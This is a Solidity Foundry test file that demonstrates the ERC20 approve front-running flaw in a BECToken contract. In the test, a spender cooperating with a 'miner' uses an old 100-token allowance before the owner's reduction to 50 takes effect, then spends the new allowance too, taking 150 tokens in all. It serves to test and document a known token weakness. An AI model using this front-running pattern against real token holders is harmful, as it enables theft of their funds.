// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/BECToken.sol";

contract BecTokenFrontRunTest is Test {
    BecToken token;
    address owner = address(0x1);
    address alice = address(0x2);
    address bob = address(0x3);
    address eve = address(0x4); // Miner address

    function setUp() public {
        vm.prank(owner);
        token = new BecToken();

        // Send tokens to Alice
        vm.prank(owner);
        token.transfer(alice, 1000 ether);
    }

    function testMinersCanDoubleSpendAllowance() public {
        // Alice approves Bob for 100 tokens
        vm.prank(alice);
        token.approve(bob, 100 ether);
        uint initialAllowance = token.allowance(alice, bob);
        assertEq(initialAllowance, 100 ether, "Initial allowance should be 100 tokens");

        // Alice intends to reduce Bob's allowance to 50 tokens
        // But before she submits this transaction, Eve (the miner) sees it in mempool
        bytes memory approvalCall = abi.encodeWithSelector(
            token.approve.selector,
            bob,
            50 ether
        );

        // Eve (miner) front-runs Alice's reduction by using the old allowance
        vm.prank(bob); // Bob cooperates with Eve the miner
        token.transferFrom(alice, eve, 100 ether);

        // Execute Alice's approval reduction after the transfer
        vm.prank(alice);
        (bool success,) = address(token).call(approvalCall);
        require(success, "Approval call failed");

        // Check that Eve received the full 100 tokens
        uint eveBalance = token.balanceOf(eve);
        assertEq(eveBalance, 100 ether, "Miner should have full initial allowance");

        // Check that Bob can spend the new reduced allowance
        vm.prank(bob);
        token.transferFrom(alice, bob, 50 ether);
        uint bobBalance = token.balanceOf(bob);
        assertEq(bobBalance, 50 ether, "Spender should have reduced allowance");

        // Total tokens taken from Alice: 150 (100 by miner + 50 by bob)
        uint finalAliceBalance = token.balanceOf(alice);
        assertEq(finalAliceBalance, 850 ether, "Alice should lose 150 tokens to double spending");
    }
}
